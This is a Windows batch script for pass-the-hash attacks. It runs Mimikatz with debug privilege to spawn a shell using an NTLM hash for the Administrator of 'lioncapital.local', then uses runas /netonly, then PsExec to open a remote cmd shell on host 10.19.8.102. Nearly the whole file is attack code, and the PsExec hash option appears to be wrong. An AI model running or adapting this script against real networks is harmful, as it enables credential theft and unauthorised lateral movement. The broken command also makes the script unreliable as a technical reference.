@echo off
REM ============================================
REM Signed_PassTheHash.bat - Pass-the-hash via signed MS binaries
REM Output: %TEMP%\pth_*.log
REM ============================================

set "OUT=%TEMP%"
set "TARGET=10.19.8.102"
set "USER=Administrator"

echo.
echo === PASS-THE-HASH via Mimikatz sekurlsa::pth ===
echo --- 1. Dumping from current box ---
if exist "%USERPROFILE%\tools\mimikatz.exe" (
    "%USERPROFILE%\tools\mimikatz.exe" "privilege::debug" "sekurlsa::pth /user:%USER% /domain:lioncapital.local /ntlm:HASH_HERE /run:cmd.exe" exit > "%OUT%\pth_output.log" 2>&1
    type "%OUT%\pth_output.log"
) else (
    echo [!] Mimikatz not in %USERPROFILE%\tools - skip
)

echo.
echo --- 2. Alternative: use runas /netonly with extracted hash ---
runas.exe /netonly /user:lioncapital.local\%USER% "cmd.exe"

echo.
echo --- 3. Lateral with psexec (signed) ---
if exist "%USERPROFILE%\tools\PsExec.exe" (
    "%USERPROFILE%\tools\PsExec.exe" \\%TARGET% -accepteula -h HASH cmd.exe
) else (
    echo [!] PsExec not in tools folder
)
